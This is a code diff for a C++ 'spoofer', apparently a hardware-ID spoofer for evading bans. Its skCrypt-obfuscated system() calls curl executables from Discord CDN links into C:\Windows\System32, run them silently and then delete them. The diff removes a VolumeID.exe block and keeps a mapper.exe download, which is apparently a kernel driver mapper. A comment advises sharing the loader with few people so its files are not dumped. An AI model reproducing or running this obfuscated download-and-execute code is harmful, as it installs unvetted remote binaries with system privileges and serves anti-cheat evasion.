@@ -2,7 +2,7 @@
 #include "skStr.h"
 
 
-// While using this execution files can be easily dumped if you replace the driver then either change the execution method or don´t share the loader to many people
+// While using this execution files can be easily dumped if you replace the driver then either change the execution method or donÂ´t share the loader to many people
 
 namespace spoofer {
 
@@ -16,12 +16,7 @@ namespace spoofer {
 			system(skCrypt("C:\\Windows\\System32\\mac.bat --silent").decrypt());
 			system(skCrypt("del C:\\Windows\\System32\\mac.bat").decrypt());
 
-			// Spoofing VolumeID (Perm)
-
-			system(skCrypt("curl https://cdn.discordapp.com/attachments/1177928842770391043/1178331905687564309/VolumeID.exe -o C:\\Windows\\System32\\VolumeID.exe --silent").decrypt());
-			system(skCrypt("C:\\Windows\\System32\\VolumeID.exe --silent").decrypt());
-			system(skCrypt("del C:\\Windows\\System32\\VolumeID.exe").decrypt());
-
+			
 			// Spoofing Diskdrive, BIOS, Baseboard (Temp)
 
 			system(skCrypt("curl https://cdn.discordapp.com/attachments/1178079946099396709/1178336708610244608/mapper.exe -o C:\\Windows\\System32\\mapper.exe --silent").decrypt());
